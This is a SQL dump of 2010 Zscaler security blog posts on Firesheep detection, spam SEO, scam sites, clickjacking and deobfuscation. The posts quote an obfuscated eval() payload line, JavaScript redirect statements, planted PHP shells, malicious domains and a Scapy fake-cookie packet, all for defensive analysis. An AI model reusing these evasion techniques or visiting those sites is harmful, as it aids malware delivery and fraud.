INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (458, 'BlackSheep - A Tool To Detect Firesheep', 'Julien Sobrier', 'November 08, 2010', 'UPDATE: see the requirements for the extension at the end of the post  UPDATE: an new version is available  UPDATE: BlackSheep for Linux is available here  UPDATE: If you use FileVault on MacOSX, you might be prompted for a password. See this thread for more information.    You\'ve probably all heard of Firesheep by now, a Firefox add-on which lets anyone hijack a user\'s session to various popular web applications when they\'re using an open wireless network. While sniffing/stealing session credentials is nothing new, Firesheep exposes this capability to the masses by automating the process so that absolutely no technical know-how is required. Unfortunately, it is actually quite difficult to defend against Firesheep because most sites only permit SSL connections during the initial login, not while surfing other pages. As such, while your username and password are encrypted, your session ID is available to all other machines on the same network.    In a previous post, Mike showed how to detect the use of Firesheep on a local network by using Wireshark and Scapy. Well, today, we\'re releasing a new Firefox add-on which makes the detection of FireSheep available to everyone and we\'re calling it BlackSheep!                	  		  			  		  		  			BlackSheep installed  		  	        BlackSheep is a Firefox add-on which warns users if someone is using Firesheep on their network. It also indicates the IP address of the machine that is spying on you.                          	  		  			  		  		  			BlackSheep warns that someone is using FireSheep  		  	                           How BlackSheep works    To understand how BlackSheep works, we first need to understand the details of FireSheep. FireSheep listens to the HTTP traffic on port 80. When it identifies a transaction to a known site (Facebook, Google, Yahoo!, etc.), it looks for specific cookie values which are then used to identify a specific user. This phase of the attack cannot be detected as it is done passively.    When FireSheep identifies a user session, it then makes a request to the same site using the user\'s cookie values in order to retrieve user information such as their name, picture, etc. This active network activity is however visible to others on the local network.    BlackSheep detects the active connection made by Firesheep. It does this by making HTTP requests to random sites handled by FireSheep every 5 minutes (configurable) with fake values. BlackSheep then listens to all HTTP requests on the network to detect if somebody else is using the same fake values.    Use Firesheep to combat.... Firesheep!    BlackSheep is based on the FireSheep source code. It reuses the same network listening back-end and the list of sites and corresponding cookies, etc. This ensures that the fake traffic generated by BlackSheep is what Firesheep is expecting.    BlackSheep in action    First, install BlackSheep here. If you already have FireSheep installed, make sure it is disabled, otherwise BlackSheep will detect that you are using FireSheep.    Then select the correct network interface in the options menu (same as FireSheep).           	  		  			  		  		  			BlackSheep preferences menu  		  	        By default, BlackSheep generates fake traffic every 5 minutes. You can change this value in the option settings.    If Firesheep is detected, you will see the following warning in your current browser tab.                	  		  			  		  		  			BlackSheep notification  		  	             Finally, here is a video of BlackSheep in action.                   Surf safe!    Requirements    In order to install BlackSheep, you need:      	Mac OS X: 10.5 or newer on an Intel processor.  	Windows: XP or newer. Install Winpcap first!  	Linux:  available here  	Firefox: 3.5 or newer. 32-bit only.      -- Julien', 'Tools', 'https://www.zscaler.com/blogs/research/blacksheep-tool-detect-firesheep');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (459, 'Recent Trends In Blackhat Spam SEO', 'Julien Sobrier', 'November 05, 2010', 'Blackhat spam SEO is still very present on the web, and there have been more changes in the past few weeks than in the months before. Here are some of the evolutions that began in the past few weeks.    More diverse TLDs    A few months ago, most of the malicious fake AV pages were hosted on .co.cc sub-domains. When the hosting providers started to shutdown these sites, the attackers pretty much deserted the TLD. The malicious pages are now spread amongst various TLDs: .NET (securityptenea.net, true-protection35.net, etc.), .IN (saveaybeve.in, lastyourholder.in, smart-filechecker.in, etc.), back in .co.cc (photolocations.co.cc, zyvsmywn.co.cc, etc.),  .cz.cc (4mut.cz.cc, 4fsb.cz.cc, etc.), IP addresses (195.54.171.13, 77.78.203.144, etc.), etc.    These sites seem to be shutdown at a steady pace, but new ones re-appear just as quickly. .IN domains are the most common in recent days.    HTML encoding    After starting to insert random white space in HTML code, fake AV pages now use HTML entities to encode HTML in random places. These simple techniques can defeat basic string-based signature detection.         	  		  			  		  		  			HTML encoding (Securty Analysis) and white spaces in the source code  		  	      JavaScript obfuscation    It used to be quite rare to find obfuscated JavaScript in fake AV pages. Not anymore. But surprisingly, the attackers have chosen not to encode the CSS included in the same file, which makes it very easy to detect these pages.                	  		  			  		  		  			Obfuscated JavaScript  		  	        JavaScript redirections    Another technique now widely used to evade security tools is to include an additional HTTP redirection by using one JavaScript statement: document.location=NEW_URL, window.location=NEW_URL or location.assign(NEW_URL).                          	  		  			  		  		  			JavaScript redirection toe actual malicious page on the same domain.  		  	      This redirection is done on the malicious domain, not on the spam page.    More actors    This is something I mentioned in previous blog posts. There are more and more newcomers who are using Blackhat spam SEO to make a few bucks: fake search engines, download sites, video sites, etc. These sites do not spread malware, but they use hijacked sites to add spam pages.                          	  		  			  		  		  			Spam page for a movie site on the hijacked domain crcomunicaciones.com  		  	        Since there are more groups in the spam SEO game, the spam pages look different (different content and different URLs), and the overall number of spam pages in popular searches remains high despite Google\'s effort to tackle this issue. I should however point out that the number of spam pages leading to malicious content has gone down since the beginning of the year.    -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/recent-trends-blackhat-spam-seo');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (460, 'The \"movie\" Rings', 'Julien Sobrier', 'November 02, 2010', 'If you\'ve recently looked for information on a movie or its trailer, you\'ve probably stumbled upon a website which claims to provide free streaming or downloads. The promise of these sites is rather dubious since this activity would be illegal.    I\'ve seen three main types of such movie scam sites. Here is how they work.    Spyware/Adware download    The most popular ring includes letmewatchthis.com, letbobwatchthis.com, letbobwatchthis.org, movie-source.org, letswatchsomething.com and hatfilmsite.org. They all look the same - a catalog of movies with a big \"Download Now\" link for each of the files.           	  		  			  		  		  			One of the fake video site  		  	           The sites do not actually host any movie files. If a user clicks on the \"Download Now\" button, he is redirected to movie-watching-site.com, and then automatically to www.movie-watching-site.com.powered-by.securewebsiteaccess.com after a few seconds. There, the user is asked to download the browser plugin ClickPotato. According to the site \"the ClickPotato add-on gives you FREE and unlimited access to all of the most popular TV shows and films online!\"         	  		  			  		  		  			Prompt to download a browser add-on  		  	            This executable is actually popular spyware known as Hotbar (currently undetected by 60% of AV vendors). Nothing else can be done on this site. If a user downloads the executable (Start button), the page does not change. If a user clicks Cancel, he is redirected back to movie-watching-site.com, but returns again to the same page on www.movie-watching-site.com.powered-by.securewebsiteaccess.com. movie-watching-site.com where he is also prompted to download another spyware disguised as VLC, a popular open-source video player.    securewebsiteaccess.com is known to host a lot of malware. I\'ve seen the the same type of page for downloading Hotbar at different sub-domains: video-streamonline.info.powered-by.securewebsiteaccess.com, messenger10-livepro-newmsn.com.powered-by.securewebsiteaccess.com, etc.    Spam SEO    dvd-eng.info uses a different technique. Legitimates sites are hacked and new spam pages with movie content are added. Like the blackhat SEO spam pages seen before, they deliver relevant content about movies to the Google bot responsible for indexing content. However, if a user accesses the same site from a Google search, they are then redirected to dvd-eng.info and then to rolly.com. rolly.com offers a paid subscription ($39.90/month) to watch movies online. I doubt that this is a legal offer, at least not in the US. The website is hosted in Netherlands.         	  		  			  		  		  			Spam page redirecting users  to dvd-eng.info  		  	             video-bill.com    Another scam is composed of elements from both the first and second types of sites previously reviewed. This time, an array of domains with similar content are involved - full-length-movies.net, alfamovie.com, movie2people.com, movie4people.net, movies-view.com, hippomovies.com, moviepro.net, etc. These sites show thousands of movies available for monthly subscription (39.99 euros/month) on video-bill.com.                     	  		  			  		  		  			All sites look the same  		  	                                      There are no shortage of video sites with too-good-to-be-true offers. There are only a few sites which offer legal TV or film streaming or downloading (iTunes, Amazon, etc.), and even fewer with free offers (Hulu, etc.). If you see offers from other sites, be aware that you will probably end up installing spyware and/or pay for something you will not actually get.    -- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/movie-rings');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (461, 'Detecting Firesheep', 'ThreatLabz', 'November 01, 2010', 'Firesheep, a Firefox plugin to do session hijacking (\"sidejacking\") by snooping on a LAN/WLAN and identifying session cookies passed in the clear over HTTP was released last week at Toorcon. To my surprise, this tool received a large amount of media attention. As the authors point out in their presentation, session hijacking is nothing new ... they actually describe it as the known \"elephant in the room.\" In fact a few years ago (2008), sidejacking was presented at DefCon and a tool was written to take advantage of Gmail cookies being passed over HTTP to hijack Gmail sessions (see preso here). This presentation and tool also received a fair bit of media attention. Unfortunately not a whole lot was done about this problem. Google did eventually provided persistent SSL/TLS sessions for Gmail users, however as the Google Handler in Firesheep shows, user\'s Google session cookies can be captured when navigating from Gmail (HTTPS) to the Google search page (HTTP) or other HTTP Google pages that continue to track your Google profile (session). As the list of Firesheep handlers shows, the problem of passing session cookies in the clear is persistent across most all mainstream web services:      So how do you the user deal with this problem of websites passing session cookies in the clear for all to snoop off the Starbucks or Panera wifi you\'re using. The proper way of dealing with this problem is to browse to these sites through a trusted network connection. If not available, an encrypted tunnel (VPN, SSH, SSL, etc.) may be established through a trusted host to secure your web transactions. In addition to these known good security practices, I also took a look at detecting if someone is running Firesheep on the LAN/WLAN that you are connected to. The first thing that Firesheep does after it detects the session cookies for a site of interest is to automatically attempt to connect and scrape the user\'s account name and avatar to then display in the Firesheep/Firefox side panel. Because Firesheep is running on the same LAN/WLAN you are able to see Firesheep\'s network transactions the same way it saw yours :)    I just used Scapy (a python packet manipulation program) and generated one packet with the Facebook details that Firesheep is looking for. Here is the Facebook Firesheep handler:    Firesheep is looking for 3 cookies (xs, c_user, and sid) being passed to Facebook. So that\'s what I generate, with a few modifications - I make my packet IP address destination just for the gateway IP (versus sending garbage to Facebook) and send bogus \"66666\" values for the three cookies. In the Scapy interactive session this was done in these three lines (for readability):                >>> get = \"GET /home.php HTTP/1.1\\r\\nHost: www.facebook.com\\r\\nUser-Agent:  Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*  /*;q=0.8\\r\\nAccept-Language: en-us,en;q=0.5\\r\\nAccept-Encoding: gzip,deflate\\r\\nAccept-  Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\nKeep-Alive: 115\\r\\nConnection: keep-alive\\r  \\nCookie: c_user=66666; sid=66; xs=6666666\\r\\n\\r\\n\"  >>> pkt = IP(dst=\"192.168.1.1\")/TCP(flags=\"SPA\",sport=12345,dport=80)/get  >>> send(pkt)      Here is the output of the packet that was generated:      Immediately after putting this packet onto the wire (well actually, it was wifi), I was able to see in Wireshark an attempted network session to Facebook with the fake session cookies that I populated.  The first packet highlighted in blue is the generated / fake Facebook session cookie packet to 192.168.1.1. Immediately following this packet being sent, we see packets being generated from my open Firefox running a Firesheep capture on the network. Firesheep immediately attempts to access www.facebook.com/home.php with the captured (fake) session cookies, only to be 302 redirected to the login.php page since the session is invalid. Any users running Firesheep on this LAN/WLAN would have also attempted this invalid session information and we would have seen it in our packet capture. From the Firesheep user\'s perspective, an error is displayed for the fake session information that I provided. Whereas, valid sessions display the account name and avatar that was scraped from accessing Facebook with the captured session cookies:    This technique could be put in a loop to generate and flood random fake session packets to provide an annoyance to the Firesheep user. Though they would just have to scroll through and ignore all of the error profiles. Also the flood of fake session packets and corresponding flood of traffic from Firesheep attempting to connect with the session cookies would likely result in a fairly unusable wifi network - and possible blacklisting from Facebook or other sites being repeatedly accessed by Firesheep with false session cookies.    The above described technique provides a 1 packet means of detecting Firesheep. Regardless of detection, users should (1) be wary of authenticating to sites on public/untrusted networks, (2) be disappointed with and encourage security changes among the web services they use, and (3) utilize encrypted tunnels (VPN, SSH, SSL proxy, etc.) to protect their session information when on public networks.    Who knows, maybe this round of attention on sidejacking will result in some real change..?', 'Analysis;Encryption', 'https://www.zscaler.com/blogs/research/detecting-firesheep');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (462, 'Halloween Likejacking Campaign', 'ThreatLabz', 'October 29, 2010', 'I\'ve already described (Facebook) \"likejacking\" in a past blog post, and we mentioned a likejacking campaign in early October here.  The latest one going around has the title:\"OMFG!! The 10 Most WEIRD Facts About HALLOWEEN! [SCARY!]!\"Currently the likejacked URLs are:hxxp://www.thefberas.info/halloween2010hxxp://www.weliketolike.net/5things/The likejacking sites are both served from 174.137.168.4 (Webair).What\'s interesting is a comment in the source of the HTML at the top of the likejack pages for both of the sites that advertises:\"If you want to sell your pages contact <removed>@hotmail.co.uk\"(I removed the email address)Presumably this likejacking campaign is advertising to advertise (likejack) your page for you.  Google searches reveal the same email address used in Facebookapplication development forums ... I think it is time for a thorough code review of this individuals Facebook application.  Especially in light of the recent Facebook application privacy breaches.', 'Phishing', 'https://www.zscaler.com/blogs/research/halloween-likejacking-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (463, 'Exploitation Using Publicly Available Base64 Encode/decode Code', 'ThreatLabz', 'October 29, 2010', 'Earlier, I blogged about malicious hidden Iframes using publicly available Base64 encode/decode scripts. Recently, we have seen additional malicious JavaScript hosted on one website, using another publicly available Base64 encode/decode scheme. Here is the initial screenshot of the malicious JavaScript code:                                 If you look at the malicious code above, you will find many malicious JAR files loaded through applets, followed by a large chunk of random text inside the ‘div’ tag, which is hidden. If someone visits this webpage, he/she will only see text labeled “Loading….”. Meanwhile, the malicious code is downloading the various JAR files and may additionally download other malicious files. An interesting fact about this code comes from the random text inside the ‘div’ tag. Initially, the purpose of the random text was unclear. I later identified another example of code using exactly the same ‘div’ tag. At that point I assumed that it wasn’t entirely random afterall. Let’s open the source code of the “js.php” file and take a look:            The above code has been manually formatted for the purpose of this blog. Looking at the above code, it is clear that eval() has been called on a function named decodeBase64() HTML parameters passed to the function. The ‘document.getElementById(‘page’).innerHTML’ function gets the text that occurs between that element\'s opening and closing tag. If we look at first image of actual exploit, you will find ‘div’ tag has ‘page’ as an ID. This means the random text inside the ‘div’ tag should be passed to this ‘eval()’ function to further decode it. Let’s do that by passing random text as parameter to the decodeBase64() function:                         Let’s pass this above script code to Malzilla for further decoding. It turns out that the decoded malicious code targets a few different vulnerabilities. Here is the short screenshot of the code,        I have also located this exact same piece of Base64 code elsewhere on Internet. In fact, this encoding technique can be found on Google code, as part of a hotot project. Here is the screenshot of the same piece of the code,    This is another case where an attacker has taken advantage of publicly available code to encode a malicious payload. This also shows how easy to find various encoding techniques on the Internet and leverage them for malicious purposes. For the purposes of this post, I won’t go into details of malicious files downloaded.         That’s it for now.         Umesh', 'Evasion/Stealth', 'https://www.zscaler.com/blogs/research/exploitation-using-publicly-available-base64-encodedecode-code');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (464, 'Another 1.5 Million Twitter Links Scanned', 'Julien Sobrier', 'October 28, 2010', 'In March 2010, I analyzed about 1 million links taken from public tweets on Twitter. I showed that the number of malicious links was less than 1%.    I have scanned another 1.5 million links in the past 3 months from Twitter public time line (1,587,824 exactly). I analyzed these URLs and the server content to find how many of them lead to malicious pages by running them through the Zscaler cloud.    Before I go into the details, I\'d like to make a few points:      	links were taken over several months, but they were analyzed immediately  	I gathered links from the public time line. Results for direct messages might be different  	the links may not be intentionally malicious, the page could have been compromised        The state of the Twitter links                	  		  			  		  		  			Top-10 domains in Twitter URLs  		  	                       Bit.ly is still the leader in number of URLs on Twitter at 33% of all URLs, compared to only 5% for the number 2 spot (twitpic.com)! However, its market share has decreased, mainly because of the arrival of new URL shortener services from big names. Google, for example, arrives in the the top-10 domains with goo.gl, a service only available since December 2009. If we add youtube.com and youtu.be, Google represents 5% of all URLs.    Other social services are becoming more and more popular links in tweets: 4square (4sq.com) is #10, Facebook (fb.me) is #13    But the hierarchy of domains stays pretty much the same as in March, overall.    How many malicious links?    Like the previous analysis, I looked for phishing sites, malware, browser exploits, etc., but not spam.    The results are the same as previous: 0.07% (1149 links) of all links are dangerous.                	  		  			  		  		  			Distribution of threats by type  		  	                     The distribution of malicious sites per domains is mainly the same as the total number of links per domain:         	  		  			  		  		  			Distribution of malicious sites per domain  		  	           twitthis.com has a high percentage of malicious links mostly due to hijacked Wordpress installations serving malware. As reported last time, mediafire.com is known to host malicious content. Some URLs shorteners like youtu.be and 4sq.com create short links for one domain only (youtube.com and foursquare.com), so they are never malicious.      This shows once again that the number of malicious links in public tweets is very low. Users should pay more attention to direct messages (private tweets), but overall they should feel safe using Twitter.    -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/another-15-million-twitter-links-scanned');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (465, 'Perl Library For Google Safe Browsing V2', 'Julien Sobrier', 'October 26, 2010', 'Google offers URL blacklists to identify malicious websites and phishing sites through the Google Safe Browsing API. It is used in pretty much all browsers (Firefox, Safari, etc.), except Internet Explorer. Version 2 has been available for a few months, but there are only 2 implementations thus far: Python (from Google) and PHP.Version 1 and 2 are supposed to provide the same coverage, but I\'ve found that Google Safe Browsing v2 lists are updated much more frequently than v1. Since I\'m using the API for several of my Perl projects, I wanted to get up to date information from Google. Until now, there was a Perl implementation for v1 only.Net::Google::SafeBrowsing2, which I\'ve developed, is the first implementation of the Google Safe Browsing v2 API for Perl and I\'ve made it available in CPAN.Here is a quick example on how to use it:  use Net::Google::SafeBrowsing2;  use Net::Google::SafeBrowsing2::Sqlite;    my $storage = Net::Google::SafeBrowsing2::Sqlite->new(file => \'google-v2.db\');  my $gsb = Net::Google::SafeBrowsing2->new(    key     => \"my key\",     storage => $storage,  );    $gsb->update();  my $match = $gsb->lookup(url => \'http://www.gumblar.cn/\');    if ($match eq MALWARE) {    print \"http://www.gumblar.cn/ is flagged as a dangerous site\\n\";  }Version 0.10.1 is the first version available on CPAN. It does not include Message Authentication Code (MAC), but otherwise it is fully functional. I\'ve been using the library successfully for a couple of weeks now. There may be a bugs left, as more unit tests are required. I encourage you to help me further develop the code. You can report bugs by posting comments here, or send me an e-mail.Despite the low version number, the library works well!Multiple backendsNet::Google::SafeBrowsing (API version 1) only uses Sqlite to store the database locally. My new library works with multiple backends: Sqlite, MySQL, Memcached, etc. I have uploaded a storage module which uses Sqlite to CPAN. I hope others will develop new backends. Check the documentation of Net::Google::SafeBrowsing2::Storage to create your own module.Documentation and examples are available on CPAN.-- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/perl-library-google-safe-browsing-v2');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (466, 'Analysis Of Multiple Exploits', 'Julien Sobrier', 'October 21, 2010', 'The most common type of malware seen in Blackhat spam SEO is the fake antivirus. But I also see other types of exploits from time to time. This week, the same malicious page came up on different domains: 4rukel.cz.cc, 4lofs.tk, 1polidsf.co.cc, 1barede.co.cc, 3timesto.tk, 4greaix.cz.cc, 4krudi.cz.cc, etc.This page is interesting because it uses exploits rather than social engineering to install the malicious code. Below are the details of the exploits / malicious code.Heavy obfuscationThe JavaScript code is heavily obfuscated. It cannot be de-obfuscated by a simple copy-paste of the code into Malzilla, some of the decoding has to be done by hand.Original malicious codeOne common technique, used in this page, to break the JavaScript de-obfuscation tool is to make references to the DOM. On this page, part of the JavaScript code is included in a textarea HTML tag. It is retrieved and executed later with code like this:eval(document.getElementByTagName(\'textarea\')[0].value);While executing the obfuscated JavaScript code, new HTML elements are added to the page, and used to store values or JavaScript code retrieved again later in the JavaScript code.First de-obfuscation pass generated new obfuscated JavaScript code!Fortunately, all the JavaScript code is inline. There is no external file, which always make the de-obfuscation harder.Multiple exploitsLike many malicious pages, several exploits are included on this page:2 malicious Java applets, using different techniques for Internet Explorer and FirefoxPDF exploitQuicktime \'_Marshaled_pUnk\' Remote Code Execution VulnerabilityHeap spray attackInternet Explorer MDAC exploitInternet Explorer \"iepeers.dll\" exploit 3 Flash exploitsPart of the code for the Java exploitI believe these exploits come from different sources because the coding style of the various functions varies greatly.This malicious page tries the different exploits until one is successful. Users need to make sure they keep both their browser and their plugins up to date.-- Julien', 'Analysis;Microsoft;Vulnerability', 'https://www.zscaler.com/blogs/research/analysis-multiple-exploits');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (467, 'Who Else Is Benefiting From The Spam SEO?', 'Julien Sobrier', 'October 19, 2010', 'Blackhat SEO spam is used mainly to redirect users to pages serving malware, often disguised as an antivirus. However, other players are using the same Blackhat spam SEO techniques (they use hijacked sites) more and more to increase traffic to their site.Fake search enginesThese sites look like a search engine. But all links are actually paid advertising. To trick the advertising networks, the user is redirected to different IP addresses when he clicks on these links, so that the advertising networks see a small amount of traffic coming from multiple addresses instead of massive amounts of traffic coming from one location.I\'ve described how these fake search engines work in detail in the post about Mother\'s day scam.p3p0.com fake search engineThese fake search engines include xaras.net, p3p0.com, yeasbear.com, xsearcher.net, smartbuzz.biz (currently blocked by Google Safe Browsing), etc.Download sitesIn the past few months, I\'ve seen more and more hijacked pages redirecting users to (illegal) download sites. These sites make money by selling subscriptions to users.Site claims to have deadliest catch.rar available for download...They redirect users to a page that claims the file they are looking for is available for download. The file name is obtained by appending .rar to the search term. In the screenshot above, a search for \"deadliest catch\" on Google lead to sapm page redirecting to http://express-downloads.com/download.php?file=deadliest%20catch.rar where the the file deadliest catch.rar is available for download.but the user must sign up first ...But the user needs to be \"to be logged in to download\" the file. After entering his e-mail address and a password, he must also make a payment to access this file.and pay to access a file which does not exist!Of course, the file does not exist. You can change the file name to any string, the site always claims the corresponding file is available:  http://express-downloads.com/download.php?file=[string].rarMost of these sites have very similar domain names: fast-downloads.biz, turbo-speed-downloads.com, express-downloads.com, thedownloadfiles.com, etc.ConclusionThere are more and more shady sites using Blackhat SEO in order to make money. And there is no shortage of vulnerable Wordpress installations to take advantage of. This type of spam will very likely exist for a long time.Botnets are already available for rent, I think it won\'t take long before hijacked sites are up for rent to increase traffic to shady websites.-- Julien', 'Compromise;Advertising', 'https://www.zscaler.com/blogs/research/who-else-benefiting-spam-seo');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (468, '\"Hot Video\" Pages: Analysis Of An Hijacked Site (Part IV)', 'Julien Sobrier', 'October 14, 2010', 'In Part I and II, I analyzed files on a hijacked web site that was part of the malicious \"Hot Video\" campaign. While doing the analysis, I looked at other hijacked domains. All these domains had one of the malicious files described in Part II which allows anyone to execute commands or upload files. Some of these files are variations of the \"Hot Video\" pages, other are unrelated to the attack.    Here are some of the more interesting scripts I found.    PHP Shell    Using PHP or shell commands through HTTP requests might still be too much work for some people! More than a few hijacked sites had a PHP shell script installed, which makes it easier to connect to the database, see the source code of any script, upload or modify files, etc.         	  		  			  		  		  			Powerful PHP shell  		  	      Because the file name of this PHP shell is always the same, it is even easier to find such hijacked sites with a single Google query.      proxy.php    As its name suggests, this script acts as a proxy. It might be used by spam sites to access the Google Hot Trends without being detected and blacklisted. This script can only be used by people who know a special \"key\" which cannot be directly derived from the source code, like in the file .sys.php analyzed earlier.           	  		  			  		  		  			PHP code of proxy.php  		  	           sitemap.php    All the hijacked sites contain a Sitemap, a file which shows the list of spam pages on the same domain and other domains. They are usually created by the same script which shows the \"Hot Video\" page (see Part III). But on a few sites, there is a separate sitemap.php file to create this list.    The script uses the list of keywords for key.txt, and the list of sites from sites.txt to generate a list of spam pages.                	  		  			  		  		  			PHP code of sitemap.php  		  	                            Script kiddies?    There shouldn\'t be too much pride in hacking a site which is already already. But some groups claimed have \"owned\" a few sites which they did not hack in the first place.                     	  		  			  		  		  			Hacker group claim to have \"onwed a site already hacked  		  	                       Conclusion    The most scary part of this analysis is that these websites remain vulnerable after months of being hijacked. Maybe their owner doesn\'t care about these sites, but they can be used to infect users at any time. Anybody with the knowledge of the right Google query can control hundreds of websites within a few minutes.      -- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/hot-video-pages-analysis-hijacked-site-part-iv');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (469, 'Halloween Tricks: Spammers Are Ready', 'Julien Sobrier', 'October 11, 2010', 'Halloween is less than a month away and vendors have already set up their stores to sell plenty of candies, pumpkins, decorations, costumes. Halloween represents big business for U.S. retailers.    Spammers are clearly not going to miss this opportunity to make some extra money. Several university websites, including  byu.edu and bowdoin.edu, have been used to host spam about Halloween costumes. If accessed from Google, the spam pages redirect to buycostumes.com. The URL to buycostumes.com contains an affiliate ID which allows the spammer to get a commission (10% to 30% of the total purchase) from the store should a redirected user ultimately make a purchase.         	  		  			  		  		  			Spam blog about Halloween costumes  		  	           A Wordpress blog with thousand of spam pages around variations of \"Halloween\" costumes has been installed on each site. On October 2nd, spammers managed to get their pages in the top results for a search of the term \"Halloween express\". The first link in Google pointed to bowdoin.edu, while the 10th link pointed to byu.edu. I\'ve contacted both universities and the spam should be shutdown soon.    This is very similar to the spam for Mother\'s day that I reported in May 2010.    -- Julien', 'Spam', 'https://www.zscaler.com/blogs/research/halloween-tricks-spammers-are-ready');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (470, 'Update To The Search Engine Security Plugin', 'Julien Sobrier', 'October 06, 2010', 'I won\'t make a new blog post every time I update the Search Engine Security add-on for Firefox, but there have been several changes since the last post.             Notification    This feature was introduced in version 1.0.4. A notification is shown on Bing, Yahoo, and Google to let users know whether the SES protection is enabled for this search engine. The notification is shown under the search input.                	  		  			  		  		  			Search Engine Security notification in Google search  		  	                       	  		  			  		  		  			Search Engine Security notification in Bing search  		  	                  User-Agent modification    Most spam pages look at the Referrer value to decide whether or not to redirect users to a malicious page. However, in some cases like the Hot Video pages, only the User-Agent value is used. One common check is to look for \"slurp\" in the user-agent string to flag the request as coming form the Yahoo crawler. If you check the \"Modify User-Agent\" checkbox in the options, the string \"slurp\" is added to the User-Agent header when you leave Google/Bing/Yahoo in addition to overriding the Referrer header.    This option provides additional protection against malicious spam SEO.                	  		  			  		  		  			New option to modify the User-Agent header  		  	                       Fix for Google Instant    Google now make new searches as you type, without reloading the page, with Google Instant. Since the plug-in was listening on new page load to add the notification under the search input, it was showing only for the first search. Version 1.0.8 ensure the notification is always shown.                	  		  			  		  		  			Search Engine Security notification with Google Instant  		  	                       French translation    The extension has been translated in French.                         If you have an older version of the plug-in installed, go to Tools > Add-Ons > Find Updates to get the latest version.    -- Julien', 'Tools', 'https://www.zscaler.com/blogs/research/update-search-engine-security-plugin');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (471, 'PHP Deobfuscation', 'Julien Sobrier', 'October 04, 2010', 'When I was analyzed the PHP scripts used for the \"Hot Video\" pages, I had to find a way to deobfuscate the PHP code. There are many tools and online services to obfuscate PHP, but very few to deobfuscate it.         	  		  			  		  		  			Obfuscated PHP code: one big eval()  		  	           PHP obfuscation is generally done with:      	Base64 encoding  	Encoding strings into hexadecimal and octal values  	Assigning functions to variables  	Multiple calls to eval()      Evalhook     This code can be deobfuscated by hand, but it takes multiple iterations and can be time-consuming. Fortunately, Steffan Esser wrote evalhook to make deobfuscation easier. His article about the tool describes how it works. Basically, it is a library used with PHP to render code that is executed by the eval() function.    There are no instructions for compiling the source code, so it took me a little bit of time to understand all the necessary steps to use the code on CentOS5. Here are basic instructions to compile the code.    First, you need:           	PHP >= v5.2  	php-devel  	PHP Zend Optimizer      CentOS5 comes with PHP 5.1, so you will need to obtain a newer version from another YUM repository. I used AtomicCorp to install the new PHP version and Zend.    Then, run these commands:                tar xvfz evalhook-0.1.tar.gz  cd evalhook  phpize   ./configure  make  sudo make install      Now, you can use the evahlhook library to deobfuscate PHP files, as described in the original article:                     $ php -d extension=evalhook.so encoded_script.php      The only inconvenience I had to deal with when using evalhook, was that the resulting code still has strings encoded with hexadecimal and octal. So I wrote a small (and ugly!) Perl script to parse these strings into ASCII. Download strings.pl if you\'re interested in using it.                          perl strings.pl source.php target.php      -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/php-deobfuscation');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (472, 'Latest Facebook Clickjacking Attack - This Poor Girl Killed Herself...', 'Michael Sutton', 'October 01, 2010', 'Clickjacking is really starting to be embraced by attackers since Jeremiah Grossman and Robert Hansen first spoke about it at OWASP NYC AppSec 2008. One of the primary targets for Clickjacking has been Facebook and most notably their new \'Like\' feature which now appears on over 2 million websites.    Most of the \'Likejacking\' attacks as they\'re commonly called, actually occur on third party websites but leverage the \'Like\' button to promote advertising scams. Today however, we spotted a clickjacking attack directly on Facebook (within an IFRAME).    The scam appears within a Facebook page entitled \'This poor girl killed herself right after her dad posted this to her wall\', which was still live at the time of this blog posting. When viewed, a user is first presented with a warning message, which is must first be accepted in order to display third party content within the following IFRAME:       http://girlkilledherself.leadhoster.com/suicide38/iframe.php              This is the clickjacking attack. Using a little social engineering, the victim is led to believe that they need to click on the numbered buttons in a particular order assuming that it\'s some form of CAPTCHA, designed to ensure that a human being is involved in the process. In reality, when selecting buttons a victim is posting this page to their wall and \'liking\' the page. Both are efforts to further promote the scam. Users of NoScript will be protected as can be seen in the screenshots below as the plugin detects the fact that transparent images have been placed over the numbered buttons using the z-index property.         The overall purpose of the scam is fairly typical of clickjacking attacks that we\'ve seen to date. When a user follows through and clicks on the buttons, they will unintentionally promote the page within Facebook and then be redirected to scams that the attacker presumably receives click-thru revenue from. It\'s always amazing to me how lucrative these attacks can be. As can be seen in the screenshot of people that \'like\' the page, hundreds of people have already fallen victim and that number quickly grew as I wrote this post.    The sites ultimately being advertised range from software to car insurance.    Fortunately this scam did nothing to infect a victim\'s PC, but I suspect that the victims are a little embarrassed that they fell for it...and Facebook is there to inform the world.      - michael', 'Click Fraud', 'https://www.zscaler.com/blogs/research/latest-facebook-clickjacking-attack-poor-girl-killed-herself');
